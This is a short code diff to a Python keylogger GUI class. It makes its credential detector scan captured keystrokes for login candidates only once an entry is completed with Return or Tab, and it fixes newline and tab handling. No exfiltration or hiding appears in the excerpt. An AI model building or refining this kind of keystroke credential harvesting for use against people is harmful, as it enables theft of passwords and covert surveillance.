@@ -350,8 +350,7 @@ class KeyloggerGUI:
             return
 
         key = self.format_key_event(event)
-        self.update_captured_text(event)
-        self.update_suspected_logins()
+        entry_completed = self.update_captured_text(event)
 
         self.keystroke_tree.insert(
             "",
@@ -365,6 +364,9 @@ class KeyloggerGUI:
 
         self.keystroke_count += 1
 
+        if entry_completed:
+            self.update_suspected_logins()
+
         self.key_count_label.config(
             text=f"Keystrokes: {self.keystroke_count}"
         )
@@ -373,21 +375,23 @@ class KeyloggerGUI:
         """Update the internal text representation of captured input."""
         if event.keysym == "BackSpace":
             self.captured_text = self.captured_text[:-1]
-            return
+            return False
 
         if event.keysym == "Return":
-            self.captured_text += "\\n"
-            return
+            self.captured_text += "\n"
+            return True
 
         if event.keysym == "Tab":
-            self.captured_text += "\\t"
-            return
+            self.captured_text += "\t"
+            return True
 
         if event.char:
             self.captured_text += event.char
 
+        return False
+
     def update_suspected_logins(self):
-        """Add newly detected login candidates to the login table."""
+        """Add newly detected completed login candidates to the table."""
         candidates = self.credential_detector.find_logins(
             self.captured_text
         )
